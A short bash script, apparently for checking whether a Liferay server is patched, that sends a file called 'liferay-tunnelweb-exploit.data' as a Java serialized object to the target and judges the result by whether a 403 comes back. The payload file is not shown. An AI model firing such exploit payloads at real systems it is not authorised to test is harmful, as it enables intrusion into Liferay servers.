#/bin/bash

if [[ $# -eq 0  ]] ; then
	echo "Script requires a host"
	echo "Example: ./script.sh http://www.liferay.com"
	exit 0
fi

HOST=$1

RESPONSE=$(curl -v -H "Content-Type: application/x-java-serialized-object" --data-binary "@liferay-tunnelweb-exploit.data" $HOST/api/liferay/pwn)

echo ""

if [[ $RESPONSE == *"HTTP Status 403"*  ]]; then
	echo -e "\xf0\x9f\x91\x8c   HTTP Status 403 has been found. Ticket should've been patched."
else
	echo -e "\xf0\x9f\x98\x9e   HTTP Status 403 has not been found. Vulnerability could still exist. Please observe the curl response."
fi